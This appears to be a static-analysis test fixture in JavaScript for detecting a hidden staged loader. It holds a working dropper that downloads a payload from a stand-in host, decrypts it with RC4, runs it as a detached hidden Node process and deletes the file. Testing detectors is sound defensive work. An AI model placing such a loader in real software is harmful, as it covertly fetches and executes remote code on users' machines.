// Synthetic regression for the existing hidden RC4-stage composite.
// Static-analysis fixture only: never execute it.
const moduleLoader = require;
const transport = moduleLoader("https");
const {spawn} = moduleLoader("child_process");
const fs = require("fs");
function rc4(key, input) {
  const s = [];
  for (let i = 0; i < 256; i++) s[i] = i;
  let j = 0;
  for (let i = 0; i < 256; i++) {
    j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
    [s[i], s[j]] = [s[j], s[i]];
  }
  let i = 0; j = 0; let output = "";
  for (const c of input) {
    i = (i + 1) % 256; j = (j + s[i]) % 256;
    [s[i], s[j]] = [s[j], s[i]];
    output += String.fromCharCode(c.charCodeAt(0) ^ s[(s[i] + s[j]) % 256]);
  }
  return output;
}
transport.get("https://stage.example.invalid/worker", response => {
  let body = "";
  response.on("data", chunk => body += chunk);
  response.on("end", () => {
    fs.writeFileSync("worker.js", rc4("key", body));
    spawn("node", ["worker.js"], {detached:true, windowsHide:true}).unref();
    fs.unlinkSync("worker.js");
  });
});
